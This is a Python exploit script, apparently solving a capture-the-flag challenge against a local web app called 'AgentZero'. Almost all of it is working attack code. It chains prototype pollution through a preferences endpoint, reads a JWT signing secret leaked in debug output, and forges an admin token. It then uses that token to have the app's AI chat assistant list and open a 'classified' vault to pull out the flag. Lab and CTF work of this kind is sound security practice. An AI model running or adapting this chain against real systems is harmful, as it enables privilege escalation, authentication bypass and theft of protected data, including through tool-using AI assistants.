#!/usr/bin/env python3
import argparse
import base64
import hashlib
import hmac
import json
import re
import sys
from http.cookiejar import CookieJar
from urllib import error, request


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip('=')


def b64url_decode(data: str) -> bytes:
    padding = '=' * ((4 - len(data) % 4) % 4)
    return base64.urlsafe_b64decode(data + padding)


class Client:
    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip('/')
        self.cj = CookieJar()
        self.opener = request.build_opener(request.HTTPCookieProcessor(self.cj))

    def _req(self, method: str, path: str, data=None, headers=None):
        if headers is None:
            headers = {}
        body = None
        if data is not None:
            body = json.dumps(data).encode()
            headers = {**headers, 'Content-Type': 'application/json'}
        req = request.Request(
            f"{self.base_url}{path}",
            data=body,
            headers=headers,
            method=method,
        )
        try:
            with self.opener.open(req, timeout=15) as resp:
                payload = resp.read().decode()
                return resp.getcode(), json.loads(payload)
        except error.HTTPError as e:
            try:
                msg = e.read().decode()
            except Exception:
                msg = str(e)
            raise RuntimeError(f"HTTP {e.code} on {path}: {msg}") from e

    def post(self, path: str, data=None, headers=None):
        return self._req('POST', path, data=data, headers=headers)

    def get(self, path: str, headers=None):
        return self._req('GET', path, data=None, headers=headers)


def forge_admin_token(user_token: str, secret: str) -> str:
    parts = user_token.split('.')
    if len(parts) != 3:
        raise RuntimeError('Malformed user JWT from /api/auth')

    payload = json.loads(b64url_decode(parts[1]).decode())
    sub = payload.get('sub')
    if not isinstance(sub, str) or not sub:
        raise RuntimeError('No valid sub claim found in user token')

    header = {'alg': 'HS256', 'typ': 'JWT'}
    admin_payload = {'sub': sub, 'role': 'admin'}

    header_b64 = b64url_encode(json.dumps(header, separators=(',', ':')).encode())
    payload_b64 = b64url_encode(json.dumps(admin_payload, separators=(',', ':')).encode())

    sig = hmac.new(
        secret.encode(),
        f"{header_b64}.{payload_b64}".encode(),
        hashlib.sha256,
    ).digest()
    sig_b64 = b64url_encode(sig)
    return f"{header_b64}.{payload_b64}.{sig_b64}"


def main():
    parser = argparse.ArgumentParser(description='AgentZero POV exploit')
    parser.add_argument(
        '--base-url',
        default='http://localhost:3001',
        help='Target base URL (default: http://localhost:3001)',
    )
    args = parser.parse_args()

    c = Client(args.base_url)

    print('[1/6] Prototype pollution via /api/preferences')
    _, pref = c.post('/api/preferences', {'__proto__': {'debug': True}})
    print(f"    response: {pref}")

    print('[2/6] Get user token + leaked JWT secret from /api/auth')
    _, auth = c.post('/api/auth', {})
    print(f"    response: {auth}")

    user_token = auth.get('token')
    debug = auth.get('debug')
    secret = debug.get('secret') if isinstance(debug, dict) else None
    if not isinstance(user_token, str) or not isinstance(secret, str):
        raise RuntimeError('Exploit failed: no token or debug.secret leak')

    print('[3/6] Forge admin JWT with leaked secret')
    admin_token = forge_admin_token(user_token, secret)
    print(f"    admin_jwt: {admin_token}")

    print('[4/6] Verify admin tools are enabled')
    _, tools = c.get('/api/tools', headers={'Authorization': f'Bearer {admin_token}'})
    print(f"    tools: {tools}")
    names = tools.get('tools', []) if isinstance(tools, dict) else []
    if 'listVaults' not in names or 'openVault' not in names:
        raise RuntimeError('Admin escalation failed: missing admin tools')

    print('[5/6] Ask model to list vaults')
    _, listing = c.post(
        '/api/chat',
        {'message': 'List all vaults with IDs and access levels.'},
        headers={'Authorization': f'Bearer {admin_token}'},
    )
    print(f"    chat response: {listing}")

    raw_vaults = listing.get('response', '[]') if isinstance(listing, dict) else '[]'
    vaults = json.loads(raw_vaults)
    classified = next((v for v in vaults if v.get('name') == 'classified'), None)
    if not classified or 'id' not in classified:
        raise RuntimeError('Could not find classified vault id')

    vault_id = classified['id']
    print(f"    classified vault id: {vault_id}")

    print('[6/6] Open classified vault and extract flag')
    _, opened = c.post(
        '/api/chat',
        {'message': f'Open vault {vault_id} and return exact contents.'},
        headers={'Authorization': f'Bearer {admin_token}'},
    )
    print(f"    chat response: {opened}")

    response_text = opened.get('response', '') if isinstance(opened, dict) else ''
    flag_match = re.search(r'ictf\{[^\s}]+\}', response_text)
    if flag_match:
        print(f"\n[+] FLAG: {flag_match.group(0)}")
    else:
        print('\n[-] Flag pattern not found, raw response above.')


if __name__ == '__main__':
    try:
        main()
    except Exception as exc:
        print(f"[!] Exploit failed: {exc}", file=sys.stderr)
        sys.exit(1)
